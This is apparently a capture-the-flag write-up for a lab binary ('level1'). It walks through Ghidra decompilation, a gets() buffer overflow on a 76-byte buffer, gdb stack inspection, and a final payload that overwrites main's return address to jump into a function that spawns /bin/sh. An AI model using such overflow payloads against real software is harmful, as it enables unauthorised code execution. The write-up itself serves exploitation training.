## Static analysis

After decompiling the binary with ghidra we get the pseudo code below: 

```
void run(void)

{
  fwrite("Good... Wait what?\n",1,0x13,stdout);
  system("/bin/sh");
  return;
}

void main(void)

{
  char local_50 [76];
  
  gets(local_50);
  return;
}
```

We have 2 functions. </br>
The `run` function that executes a shell. </br>
The `main` function that have buffer of 76 bytes and call the `gets` function with the buffer.

## Vulnerability found 

The `gets` function write the user input from stdin inside the buffer. `gets` doesn't verify the length of the user input (buffer overrun), which make it a vulnerable function. <br/>
We can write more bytes in memory than the buffer can save, we can corrupt memory.

## Dynamic Analysis

We fill the 76 characters of the buffer and display the stack
```
(gdb) r <<< $(python -c 'print "A" * 76')
(gdb) x/32x $esp 
0xbffff6d0:	0xbffff6e0	0x0000002f	0xbffff72c	0xb7fd0ff4
0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff700:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff710:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff720:	0x41414141	0x41414141	0x41414141	0xb7e45400
```

Just after the buffer we have the address `0xb7e45400`, which correspond to the return address of the main function
```
(gdb) x 0xb7e45400
0xb7e45400 <__libc_start_main+32>:	0x85ffffff
```

We can overwrite the address of the return function of main and redirect the execution
```
(gdb) r <<< $(python -c 'print "A" * 76 + "B"*4')
...
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```


## Payload construction 

In the static analysis we found that the `run` function executes a shell.

We can overwrite the `return address of main` by the address of the `run` function. 
```
info functions
...
0x08048444  run

payload: (python -c 'print "A" * 76 + "\x44\x84\x04\x08"')
```

We redirect the stream to the program with a pipe and we add the command `cat` to keep the shell alive.
```
(python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
```


